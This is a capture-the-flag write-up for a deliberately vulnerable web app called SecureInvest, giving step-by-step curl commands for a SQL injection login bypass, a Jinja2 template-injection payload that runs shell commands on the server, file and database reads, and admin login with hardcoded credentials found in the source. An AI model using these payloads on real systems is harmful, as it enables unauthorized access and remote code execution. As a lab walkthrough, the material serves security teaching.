# secure-investment-writeup
# SecureInvest CTF Challenge

## Complete Step-by-Step Writeup

This README provides a clear, structured walkthrough of the SecureInvest CTF challenge, demonstrating reconnaissance, exploitation, privilege escalation, and final flag extraction.

---

## 🎯 Target Information

**Target URL:** [https://web-chall-2cek.onrender.com](https://web-chall-2cek.onrender.com)

---

## 🔎 Step 1: Initial Reconnaissance

### Check the main page

```bash
curl https://web-chall-2cek.onrender.com
```

**Result:** Basic financial landing page with a login link.

### Check the login page

```bash
curl https://web-chall-2cek.onrender.com/login
```

**Result:** Login form discovered.

---

## 🐍 Step 2: SQL Injection Bypass

### Test SQL Injection

```bash
curl -X POST https://web-chall-2cek.onrender.com/login \  
  -d "username=admin&password=admin' OR '1'='1" -L -v
```

**Status:** SQL injection successful → redirected to `/dashboard`.

### Save session cookies and view dashboard

```bash
curl -c cookies.txt -X POST https://web-chall-2cek.onrender.com/login \
  -d "username=admin&password=admin' OR '1'='1" -L -s

curl -b cookies.txt https://web-chall-2cek.onrender.com/dashboard -s
```

**Result:** Logged in as `john_doe`. Found two search forms.

---

## 🧪 Step 3: SSTI Discovery

### SSTI Test

```bash
curl -b cookies.txt -X POST https://web-chall-2cek.onrender.com/vulnerable_search \  
  -d "search={{7*7}}" -s
```

**Result:** Returns `49` → SSTI confirmed.

---

## 📁 Step 4: File System Enumeration (via SSTI)

### List files

```bash
curl -b cookies.txt -X POST https://web-chall-2cek.onrender.com/vulnerable_search \
  -d "search={{lipsum.__globals__['os'].popen('ls').read()}}" -s
```

**Files Found:**

* app.py
* database.db
* backup/
* templates/
* static/

### Inspect `backup/`

```bash
curl -b cookies.txt -X POST https://web-chall-2cek.onrender.com/vulnerable_search \
  -d "search={{lipsum.__globals__['os'].popen('ls backup').read()}}" -s
```

**Backup Contents:**

* backup_2024.sql
* server_backup.txt
* myenv/

---

## 🧵 Step 5: Source Code Extraction

### Read `app.py`

```bash
curl -b cookies.txt -X POST https://web-chall-2cek.onrender.com/vulnerable_search \
  -d "search={{lipsum.__globals__['os'].popen('cat app.py').read()}}" -s
```

**Important Findings:**

* **Flag 1 stored in `server_backup.txt`**
* **Admin credentials hardcoded:** `t3rm14t0rs@dm1n` / `SuperSecretAdminPass2024!`

---

## 🚩 Step 6: Capture Flag 1

```bash
curl -b cookies.txt -X POST https://web-chall-2cek.onrender.com/vulnerable_search \  
  -d "search={{lipsum.__globals__['os'].popen('cat backup/server_backup.txt').read()}}" -s
```

**FLAG 1:** `flag{S3cur3_1nv3st_App}`

---

## 🔐 Step 7: Admin Privilege Escalation

### Login as admin

```bash
curl -c admin_cookies.txt -X POST https://web-chall-2cek.onrender.com/login \  
  -d "username=t3rm14t0rs@dm1n" -d "password=SuperSecretAdminPass2024!" -L -s
```

### Access dashboard

```bash
curl -b admin_cookies.txt https://web-chall-2cek.onrender.com/dashboard -s
```

**Result:** Admin panel link available.

---

## 🚩 Step 8: Capture Flag 2

### Access admin panel

```bash
curl -b admin_cookies.txt https://web-chall-2cek.onrender.com/admin -s
```

**FLAG 2:** `flag{Y0ur_0n3_w4y_t0_h4ck1ng}`

---

## 🗄️ Step 9: Database Enumeration

### View SQLite tables

```bash
curl -b cookies.txt -X POST https://web-chall-2cek.onrender.com/vulnerable_search \
  -d "search={{lipsum.__globals__['os'].popen('sqlite3 database.db .tables').read()}}" -s
```

**Database Name:** `secure_investments_db`

---

## 📝 Final Summary

### Flags Obtained

| Flag                            | Location                 | Method               |
| ------------------------------- | ------------------------ | -------------------- |
| `flag{S3cur3_1nv3st_App}`       | backup/server_backup.txt | File read via SSTI   |
| `flag{Y0ur_0n3_w4y_t0_h4ck1ng}` | /admin panel             | Privilege escalation |

### Vulnerabilities Exploited

* SQL Injection (authentication bypass)
* SSTI leading to remote code execution
* Hardcoded credentials
* Sensitive backups accessible
* Poor input validation

### Attack Chain Summary

```
SQL Injection → SSTI → File Read → Credential Extraction → Admin Access → Flags
```

---

## 📌 Conclusion

This challenge demonstrates how multiple weak points (SQLi, SSTI, insecure backups, hardcoded secrets) can be chained to gain full system compromise. Proper validation, sanitization, and secure coding practices are essential to prevent such attacks.

---

**Author:** 3sy
